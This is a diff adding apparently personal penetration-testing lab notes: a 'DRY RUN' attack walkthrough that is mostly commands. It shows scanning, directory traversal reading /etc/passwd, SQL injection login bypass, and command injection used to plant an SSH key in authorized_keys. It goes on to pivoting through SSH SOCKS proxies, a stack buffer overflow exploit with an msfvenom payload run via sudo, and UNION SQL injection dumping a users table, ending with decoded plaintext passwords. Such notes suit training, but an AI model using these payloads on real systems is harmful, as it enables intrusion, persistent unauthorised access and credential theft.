@@ -271,7 +271,6 @@ print (offset)
 python linbuff.py | ./func (should crash it: Segmentation fault (core dumped))
 gdb ./func
 do run <<<$(python linbuff.py) (look what is overwritten) should see 0x41414141 in ?? ()
-	(instead of <<<$ do ./exploit_me "'python<script>'")
 quit and use wiremask.eu
 take the pattern and replace the "A" * 100 with your pattern
 ```
@@ -537,6 +536,150 @@ Pay Attention to these 4 directories
 /var/spool/cron/crontabs/
 /etc/crontab
 /etc/cron.d/
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+DRY RUN
+	ping <given ip>
+	nmap -T5 -Pn -sV -n <given ip>
+	nmap -T5 -Pn -n <given ip> -p-
+		Ports of intrest
+	nmap -T5 -sT --script=http-enum <given ip>
+		Items of interest
+	firefox:\\<given ip>:80
+		Duplicated based on items of interest and add them to the end with /<item>
+		Take down key information like names, emails, titles, places, .etc
+		We found login box, malicious upload, File to read (directory traversal)
+	File to Read
+		take down all of /etc/passwd from file to read
+		look at /etc/hosts for next target box
+	Login Box
+		'OR 1='1 in user and password
+		new input box is command injection
+			;whoami
+				www-data
+			;cat /etc/passwd
+			;cat /etc/hosts
+		lin-ops$ ssh-keygen -t rsa -b 4096
+			cat .ssh/id_rsa.pub then copy for you ssh exploit
+		admin page
+			;ls -lisa /var/www
+			;mkdir /var/www/.ssh
+			;ls -lisa /var/www
+			;touch /var/www/.ssh/authorized_keys
+			;ls -lisa /var/www/.ssh
+			;echo "<fat string>" >> /var/www/.ssh/authorized_keys
+			;cat /var/www/.ssh/authorized_keys
+			;ls -lisa /var/www/html
+			;ls -lisaR /var/www/html
+				recursive search to organize the files and directories
+		lin-ops$ ssh -ms /tmp/jump www-data@<given ip>
+			now in www-data
+			publicfacingwebsite$ for i in {1..254} ;do (ping -c 1 <target range>.$i | grep "bytes from" &) 2>/dev/null ;done
+				given 2 targets, not just one
+		lin-ops$ ssh -S /tmp/jump jump -O forward -D9050
+			proxychains nmap -T5 -Pn -sV -n <new host1>
+			proxychains nmap -T5 -Pn -sV -n <new host2>
+		lin-ops$ ssh -S /tmp/jump jump -O forward -D9050 -L<my forward1> -L<my forward2> -L<my forward3> ...
+		publicfacing$ ls -lisa
+			sudo -l
+			cd to location
+			./exploit_me
+			./exploit_me jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
+			nano exploit.py
+				```
+				buffer = "A" * 200
+
+				#eip = "BBBB"
+
+				#nop = '\x90' * 5
+
+				print(bufffer)
+				```
+			./exploit_me "`python exploit.py`"
+			gdb ./exploit_me
+				run $(python exploit.py)
+			firefox:\\wiremask
+				copy the gen pattern
+			nano exploit.py
+				```
+				buffer = <mask>
+
+				#eip = "BBBB"
+
+				#nop = '\x90' * 5
+
+				print(bufffer)
+				```
+			gdb ./exploit_me
+				run $(python exploit.py)
+			firefox:\\wiremask
+				copy the offset
+			nano exploit.py
+				```
+				buffer = "A" * <offset>
+	
+				#eip = "BBBB"
+
+				#nop = '\x90' * 5
+
+				print(bufffer)
+				```
+			env - gdb exploit_me
+				show env
+				unset env LINES
+				unset env COLUMNS
+				show env
+				run
+				info proc map
+				find /b <first below heap>, <last above stack>, 0xff, 0xe4
+				copy second address and flip to little endian
+			nano exploit.py
+				```
+				buffer = "A" * <offset>
+	
+				eip = "\xab\x12\xcd\x34"
+
+				nop = '\x90' * 5
+
+				print(bufffer + eip + nop)
+				```
+		lin-ops$ msfvenom -p linux/x86/exec CMD="cat /root/secret_msg.txt" -b "\x00" -f python
+		openfacing$
+			nano exploit.py
+				```
+				buffer = "A" * <offset>
+	
+				eip = "\xab\x12\xcd\x34"
+
+				nop = '\x90' * 5
+
+				<copied buf>
+
+				print(bufffer + eip + nop + buf)
+				```
+		openfacing$ sudo ./exploit_me "`python exploit.py`"
+		firefox:\\127.0.0.1:<bestwebapp http port>
+			URL sqlinjection
+				product=? or 1=1
+				find the ?
+				product=7 or 1=1
+				product=7 Union select 1,2,3 #
+					order i descoved
+				product=7 Union select 1,3,2 #
+				union select table_schema,column_name,table_name FROM information_schema.columns # (DUPLICATE)
+					found siteusers database
+				Union select name,username,@@version FROM siteusers.users #
+					
+				Union select name,username,user_id FROM siteusers.users #
+					passwords cant be read
+			BACK AT ADMIN PAGE DECODE STRING
+				decode all passwords
+					Aaron		appleBottomJ3an$
+					user2		TurkeyDay24
+					user3		Bob4THEPin3apples
+					Lee_Roth	Lroth
+					Lroth		anotherpassword4THEages
+					
+
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 Scheme of Maneuver:
 >Jump Box
